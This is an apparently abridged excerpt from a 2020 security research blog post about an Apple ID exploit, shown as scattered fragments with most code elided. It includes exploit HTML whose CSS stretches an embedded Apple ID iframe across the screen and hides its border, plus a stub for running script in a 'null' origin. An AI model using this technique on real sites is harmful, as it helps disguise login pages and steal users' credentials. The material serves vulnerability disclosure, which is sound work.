...
import { Frac, Chem } from '@zemn.me/linear';
export const date = new Date("Thu Aug 13 2020 19:52:18 GMT+0100 (British Summer Time)")
...
The Very Worst Thing {#the_very_worst_thing}
--------------------------------------------

[The Very Worst Thing]: #the_very_worst_thing

[§2]: #the_very_worst_thing
...
<!DOCTYPE HTML>
<!-- a sneaky title for a sneaky exploit -->
...
//!
//! Here, we make the Apple ID iframe (defined later)
//! fill the user's screen, and remove the telltale iframe
//! border.
    style to make the sneakily embedded AppleID page less obvious
*/
.idmsa-frame {
    width: 100vw;
    height: 100vh;
...
//! We want to make our 'null' origin page.
...
// Runs a given javascript function (given as text)
// inside a 'null' origin.
const runFunctionInNullOrgin = javascriptCode => {
    ...
    // Our code won't run without scripts!
